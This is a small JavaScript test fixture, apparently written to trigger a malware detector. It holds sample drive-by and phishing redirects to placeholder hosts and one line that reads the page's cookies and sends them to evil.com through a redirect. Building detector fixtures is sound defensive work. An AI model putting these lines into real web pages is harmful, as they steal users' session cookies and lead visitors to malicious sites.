// TEST FILE: Malicious redirects
// This should trigger: js_malware detector

// Suspicious redirect patterns
window.location = "http://malware.tk/drive-by";
document.location.href = "http://phishing.ml/login";
location.replace("http://evil.ga/exploit");
top.location = "http://192.168.1.100/payload";

// Cookie access before redirect
var cookies = document.cookie;
window.location = "http://evil.com/steal?c=" + cookies;
